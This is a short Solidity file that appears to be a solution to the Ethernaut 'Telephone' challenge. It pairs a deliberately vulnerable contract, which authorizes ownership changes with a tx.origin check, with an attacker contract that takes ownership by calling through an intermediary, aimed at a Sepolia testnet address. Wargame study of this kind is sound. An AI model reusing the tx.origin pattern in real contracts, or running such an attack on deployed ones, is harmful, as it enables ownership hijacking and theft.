// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//address on sepolia : 0x069A01f1C8C4391F292a0804da8BF8bf7dB9dE3F
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract attackTelephon {
    Telephone telephone = Telephone(0x069A01f1C8C4391F292a0804da8BF8bf7dB9dE3F);

    function attack(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }

    function newOwner() public view returns (address) {
        return telephone.owner();
    }
}
